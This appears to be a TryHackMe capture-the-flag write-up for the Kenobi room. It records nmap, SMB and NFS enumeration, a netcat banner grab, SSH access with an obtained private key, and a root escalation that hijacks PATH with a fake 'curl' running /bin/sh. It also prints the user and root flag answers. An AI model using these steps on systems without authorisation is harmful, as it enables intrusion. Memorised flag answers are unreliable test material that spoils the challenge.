# [Room Name] — TryHackMe Writeup
**Difficulty:** Easy  
**Platform:** TryHackMe  
**Room URL:** https://tryhackme.com/room/[room-name]  
**Date Completed:** 16/08/2026  
**Time Taken:** 1.5 hours  
**OS:** Linux

---

## Table of Contents
1. [Task 1](#1-Task-1)
2. [Task 2](#2-Task-2)
3. [Task 3](#3-Task-3)
4. [Task 4](#4-Task-4)


---

## 1. Task 1

### Question 1.1
**Question:** Scan the machine with nmap, how many ports are open?

**Answer:** `7`

**How I found it:**
```bash
nmap -sV -SS -T5 10.48.176.164
```

**Open Ports Found:**

| Port | Service | Version |
|:---:|:---|:---|
| 21 | FTP | ProFTPD 1.3.5 |
| 22 | SSH | OpenSSH 8.2 |
| 80 | HTTP | Apache 2.4.41 |
| 111 | rpcbind | rpc #100000 |
| 139 | SMB | Samba 4 |
| 445 | SMB | Samba 4 |
| 2049 | nfs | rpc #100003 |

**Screenshot:**  

<img width="767" height="289" alt="image" src="https://github.com/user-attachments/assets/ba5a1632-d36e-45df-9657-dbb69f79bd28" />

---

## 2. Task 2

### Question 2.1
**Question:** Using the nmap command above, how many shares have been found?

**Answer:** `3`

**How I found it:**
```bash
smbclient -L //10.48.176.164/ -N -p 445
```

**Screenshot:**  

<img width="1033" height="199" alt="image" src="https://github.com/user-attachments/assets/7cb4b7b4-9c59-4adc-9357-162767f40fec" />

### Question 2.2
**Question:** Once you're connected, list the files on the share. What is the file can you see?

**Answer:** `log.txt`

**How I found it:**
```bash
smbclient //10.48.176.164/anonymous -N -p 445
```

**Screenshot:**  

<img width="622" height="150" alt="image" src="https://github.com/user-attachments/assets/e8ed4c0c-620c-4255-b5a2-fee4e2bdaf7f" />

### Question 2.3
**Question:** What port is FTP running on?

**Answer:** `21`

### Question 2.4
**Question:** In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.48.176.164

What mount can we see?

**Answer:** `/var`

**How I found it:**
```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.48.176.164
```

**Screenshot:**  

<img width="617" height="471" alt="image" src="https://github.com/user-attachments/assets/a596b557-15b9-47ac-a82d-619f336a67ba" />

---

## 3. Task 3

### Question 3.1
**Question:** Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. What is the version?

**Answer:** `1.3.5`

**How I found it:**
```bash
nc 10.48.176.164 21
```

**Screenshot:**  

<img width="576" height="49" alt="image" src="https://github.com/user-attachments/assets/59d399a1-b505-40df-a531-46afacd3123e" />

### Question 3.2
**Question:** How many exploits are there for the ProFTPd running?

**Answer:** `4`

**How I found it:**
```bash
searchsploit proftpd 1.3.5
```

**Screenshot:**  

<img width="1247" height="185" alt="image" src="https://github.com/user-attachments/assets/eae359c6-e6c7-48e9-b69f-a863d314c9a3" />

### Question 3.3
**Question:** What is Kenobi's user flag (/home/kenobi/user.txt)?

**Answer:** `d0b0f3f53b6caa532a83915e19224899`

**How I found it:**
```bash
sudo ssh -i id_rsa kenobi@10.48.176.164
cat user.txt
```
---

## 4. Task 4

### Question 4.1
**Question:** To search the a system for these type of files run the following: find / -perm -u=s -type f 2>/dev/null
              What file looks particularly out of the ordinary?

**Answer:** `/usr/bin/menu`

**How I found it:**
```bash
find / -perm -u=s -type f 2>/dev/null
```

**Screenshot:**  

<img width="511" height="548" alt="image" src="https://github.com/user-attachments/assets/bd7dd7c2-4aa4-46b2-b3d6-0d61d416ca9b" />

### Question 4.2
**Question:** Run the binary, how many options appear?

**Answer:** `3`

**How I found it:**
```bash
menu
```

**Screenshot:**  

<img width="338" height="115" alt="image" src="https://github.com/user-attachments/assets/6c6dca35-ab87-4b86-8a33-01f9c109cb59" />

### Question 4.3
**Question:** What is the root flag (/root/root.txt)?

**Answer:** `177b3cd8562289f37382721c28381f02`

**How I found it:**
```bash
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

**Screenshot:**  

<img width="1066" height="309" alt="image" src="https://github.com/user-attachments/assets/9e3edc19-51b5-42b0-bcb8-351c1935e575" />
